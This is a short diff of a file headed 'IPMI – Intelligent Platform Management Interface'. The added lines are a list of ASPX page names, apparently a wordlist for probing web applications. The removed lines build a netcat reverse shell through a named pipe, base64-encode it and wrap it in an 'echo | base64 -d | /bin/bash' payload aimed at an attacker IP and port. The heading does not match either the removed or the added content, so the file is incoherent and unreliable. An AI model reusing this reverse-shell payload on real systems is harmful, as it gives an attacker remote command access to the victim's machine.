@@ -1,10 +1,22 @@
 # IPMI – Intelligent Platform Management Interface
 
-ps1 = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {args.local_ip} {args.port} > /tmp/f"
+admin.aspx
+default.aspx
+menu.aspx
+home.aspx
+principal.aspx
+usuarios.aspx
+reportes.aspx
+reportviewer.aspx
+exportar.aspx
+panel.aspx
+dashboard.aspx
+config.aspx
+consulta.aspx
+listado.aspx
+detalle.aspx
 
-ps2 = base64.b64encode(ps1.encode()).decode()
 
-payload = f"echo {ps2} | base64 -d | /bin/bash"
 
 
 
